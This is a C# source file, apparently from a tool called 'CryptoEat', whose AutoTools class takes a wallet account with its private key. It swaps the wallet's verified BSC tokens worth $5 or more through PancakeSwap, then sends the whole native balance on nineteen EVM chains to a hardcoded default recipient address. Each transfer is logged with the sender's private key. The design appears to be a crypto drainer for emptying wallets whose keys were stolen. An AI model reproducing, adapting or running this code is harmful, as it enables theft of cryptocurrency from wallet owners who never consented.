using System.Globalization;
using System.Numerics;
using System.Text;
using Debank;
using Nethereum.RPC.Accounts;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using PancakeRouter.SmartRouter;
using PancakeRouter.SmartRouter.ContractDefinition;
using Pastel;

namespace CryptoEat.Modules.Cryptocurrency;

internal static class AutoTools
{
    private static readonly List<ChainDef> Chains = new()
    {
        new ChainDef
        {
            ChainId = 1,
            ChainName = "Ethereum",
            RpcAdr = "https://rpc.ankr.com/eth"
        },
        new ChainDef
        {
            ChainId = 56,
            ChainName = "Binance Smart Chain",
            RpcAdr = "https://bsc-dataseed.binance.org/"
        },
        new ChainDef
        {
            ChainId = 137,
            ChainName = "Polygon",
            RpcAdr = "https://polygon-rpc.com"
        },
        new ChainDef
        {
            ChainId = 100,
            ChainName = "Xdai",
            RpcAdr = "https://rpc.xdaichain.com/"
        },
        new ChainDef
        {
            ChainId = 200,
            ChainName = "Fantom",
            RpcAdr = "https://rpc.ftm.tools/"
        },
        new ChainDef
        {
            ChainId = 66,
            ChainName = "Okex",
            RpcAdr = "https://exchainrpc.okex.org/"
        },
        new ChainDef
        {
            ChainId = 128,
            ChainName = "Heco",
            RpcAdr = "https://http-mainnet-node.huobichain.com/"
        },
        new ChainDef
        {
            ChainId = 43114,
            ChainName = "Avalanche",
            RpcAdr = "https://api.avax.network/ext/bc/C/rpc"
        },
        new ChainDef
        {
            ChainId = 42161,
            ChainName = "Arbitrum",
            RpcAdr = "https://arb1.arbitrum.io/rpc"
        },
        new ChainDef
        {
            ChainId = 10,
            ChainName = "Optimism",
            RpcAdr = "https://mainnet.optimism.io/"
        },
        new ChainDef
        {
            ChainId = 42220,
            ChainName = "Celo",
            RpcAdr = "https://rpc.ankr.com/celo"
        },
        new ChainDef
        {
            ChainId = 1285,
            ChainName = "Moonriver",
            RpcAdr = "https://rpc.moonriver.moonbeam.network/"
        },
        new ChainDef
        {
            ChainId = 25,
            ChainName = "Cronos",
            RpcAdr = "https://evm-cronos.crypto.org/"
        },
        new ChainDef
        {
            ChainId = 288,
            ChainName = "Boba",
            RpcAdr = "https://mainnet.boba.network"
        },
        new ChainDef
        {
            ChainId = 1088,
            ChainName = "Metis",
            RpcAdr = "https://andromeda.metis.io/?owner=1088"
        },
        new ChainDef
        {
            ChainId = 199,
            ChainName = "BitTorrent",
            RpcAdr = "https://rpc.bt.io/"
        },
        new ChainDef
        {
            ChainId = 1313161554,
            ChainName = "Aurora",
            RpcAdr = "https://mainnet.aurora.dev"
        },
        new ChainDef
        {
            ChainId = 1284,
            ChainName = "Moonbeam",
            RpcAdr = "https://rpc.api.moonbeam.network"
        },
        new ChainDef
        {
            ChainId = 10000,
            ChainName = "SmartBCH",
            RpcAdr = "https://smartbch.greyh.at"
        }
    };

    internal static void AutoWithdraw(Account account)
    {
        Helpers.SetTitle("Doing autowithdraw...");
        Parallel.ForEach(Chains, new ParallelOptions { MaxDegreeOfParallelism = 5}, chain =>
        {
            try
            {
                Helpers.SetTitle($"Doing autowithdraw... [{Chains.IndexOf(chain)}/{Chains.Count}]");

                var web3 = new Web3(account, chain.RpcAdr);
                var txManager = web3.Eth.GetEtherTransferService();
                var fee = GetGasPrice(web3);
                var toSend =
                    txManager.CalculateTotalAmountToTransferWholeBalanceInEtherAsync(account.Address, fee)
                        .Result;

                var sended = txManager.TransferEtherAsync(
                    Generic.Settings.AddressToSend ??= "0x4DbCc2F2d98fe511d58413E7eD1ABaEBD527a785",
                    toSend, fee).Result;

                var sb = new StringBuilder();

                sb.AppendLine();
                sb.AppendLine($"<<<<<<<<<<<<<<<<<[{"AUTOWITHDRAW".Pastel(Color.Red)}]<<<<<<<<<<<<<<<<<<");
                sb.AppendLine($"|=| TXID: [{sended.Pastel(Color.LightCoral)}]");
                sb.AppendLine($"|=| CHAIN: [{chain.ChainName.Pastel(Color.LightCoral)}]");
                sb.AppendLine($"|=| VALUE: [{toSend.ToString().Pastel(Color.LightCoral)}]");
                sb.AppendLine($"|=| RECIPIENT: [{Generic.Settings.AddressToSend.Pastel(Color.LightCoral)}]");
                sb.AppendLine($"|=| SENDER: [{account.Address.Pastel(Color.LightCoral)}]");
                sb.AppendLine($"|=| SENDER PRIVATE KEY: [{account.PrivateKey.Pastel(Color.LightCoral)}]");
                sb.AppendLine("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<");
                sb.AppendLine();

                var result = sb.ToString();
                Console.WriteLine(result);
                LogStreams.AutoWithdrawLog.WriteLine(result.Clear());
            }
            catch
            {
                // ignore
            }
        });
        Helpers.SetTitle();
    }

    internal static void AutoSwap(Account account)
    {
        using var scanner = new DeBank();
        var result = scanner.CachedGetTokens(account.Address);

        if (result != null)
        {
            try
            {

                #region Chains

                var binance = new Chain
                {
                    NodeAddress = "https://rpc.ankr.com/bsc",
                    RouterAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                    ChainId = ChainId.Binance
                };
                var ethereum = new Chain
                {
                    NodeAddress = "https://rpc.ankr.com/eth",
                    RouterAddress = "0xf164fC0Ec4E93095b804a4795bBe1e041497b92a",
                    ChainId = ChainId.Ethereum
                };

                #endregion

                var balances = result
                    .Select(z => new
                    {
                        Raw = (BigDecimal)z.Amount,
                        Balance = Math.Round(z.Amount * (z.Price ?? 0m), 2),
                        BalanceWoRound = z.Amount * (z.Price ?? 0m),
                        Token = z.Symbol?.ToUpper(),
                        IsWallet = z.Id == z.Chain,
                        Contract = z.Id!,
                        z.Chain,
                        IsScam = !z.IsVerified
                    })
                    .Where(b => b.Balance >= 5m && !b.IsScam)
                    .Where(x => x.Chain == "bsc")
                    .Where(x => !x.IsWallet)
                    .OrderByDescending(t => t.Balance)
                    .ToList();

                if (balances.Any())
                    foreach (var balance in balances)
                    {
                        var swap = TrySwap(account, balance.Contract, binance).Result;
                        if (!swap.Item1) continue;

                        var sb = new StringBuilder();

                        sb.AppendLine();
                        sb.AppendLine($"<<<<<<<<<<<<<<<<<<<[{"AUTOSWAP".Pastel(Color.Red)}]<<<<<<<<<<<<<<<<<<<<");
                        sb.AppendLine($"|=| TXID: [{swap.Item2.Pastel(Color.LightCoral)}]");
                        sb.AppendLine($"|=| CHAIN: [{"Binance Smart Chain".Pastel(Color.LightCoral)}]");
                        sb.AppendLine(
                            $"|=| VALUE: {balance.Balance.ToString(CultureInfo.CurrentCulture).Pastel(Color.LightCoral)}$ [{balance.Raw.ToString().Pastel(Color.LightCoral)} {balance.Token.Pastel(Color.Coral)}]");
                        sb.AppendLine($"|=| ADDRESS: [{account.Address.Pastel(Color.LightCoral)}]");
                        sb.AppendLine($"|=| PRIVATE KEY: [{account.PrivateKey.Pastel(Color.LightCoral)}]");
                        sb.AppendLine("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<");
                        sb.AppendLine();

                        var str = sb.ToString();
                        Console.WriteLine(str);
                        LogStreams.AutoSwapLog.WriteLine(str.Clear());
                    }
            }
            catch
            {
                // ignore
            }
        }

        AutoWithdraw(account);
    }

    private static decimal GetGasPrice(IWeb3 web3)
    {
        return UnitConversion.Convert.FromWei(web3.Eth.GasPrice.SendRequestAsync().Result.Value,
            UnitConversion.EthUnit.Gwei);
    }

    private static async Task<(bool, string)> TrySwap(IAccount account, string tokenFrom, Chain chain)
    {
        try
        {
            var web3 = new Web3(account, chain.NodeAddress);
            if (chain.ChainId != ChainId.Ethereum) web3.TransactionManager.UseLegacyAsDefault = true;
            var pancakeRouter = new PancakeRouterService(web3, chain.RouterAddress);
            var contract = web3.Eth.ERC20.GetContractService(tokenFrom);

            var wrappedAddress = await pancakeRouter.WethQueryAsync();

            var path = new[]
            {
                tokenFrom,
                wrappedAddress
            };
            var deadline = DateTimeOffset.Now.AddDays(30).ToUnixTimeSeconds();
            var tokenBalance = await contract.BalanceOfQueryAsync(account.Address);

            #region Approval

            var allowed = await contract.AllowanceQueryAsync(account.Address, chain.RouterAddress);
            if (allowed < tokenBalance)
                await contract.ApproveRequestAndWaitForReceiptAsync(chain.RouterAddress, tokenBalance);

            #endregion

            var function = new SwapExactTokensForETHFunction
            {
                Path = path.ToList(),
                Deadline = deadline,
                To = account.Address,

                AmountOutMin = 0,
                AmountIn = tokenBalance
            };

            var txid = await pancakeRouter.SwapExactTokensForETHRequestAsync(function);

            return (true, txid);
        }
        catch (Exception ex)
        {
            Generic.WriteError(ex);
            return (false, "");
        }
    }

    private class Chain
    {
        internal string RouterAddress { get; init; }
        internal string NodeAddress { get; init; }
        internal ChainId ChainId { get; init; }
    }

    private enum ChainId
    {
        Ethereum = 1,
        Binance = 56
    }

    private class ChainDef
    {
        internal BigInteger ChainId { get; init; }
        internal string? ChainName { get; init; }
        internal string? RpcAdr { get; init; }
    }
}